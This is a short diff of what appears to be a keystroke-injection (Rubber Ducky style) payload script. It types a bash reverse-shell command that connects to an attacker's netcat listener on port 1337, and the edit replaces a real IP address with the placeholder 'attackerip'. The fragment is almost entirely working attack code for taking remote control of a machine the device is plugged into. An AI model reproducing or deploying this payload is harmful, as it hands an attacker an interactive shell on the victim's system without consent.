@@ -22,7 +22,7 @@ ENTER
 DELAY 500
 
 REM Sending reverse interactive shell to attacker's 1337 netcat listener.
-STRING bash -i >& /dev/tcp/159.65.139.210/1337 0>&1
+STRING bash -i >& /dev/tcp/attackerip/1337 0>&1
 DELAY 500
 ENTER
 DELAY 500
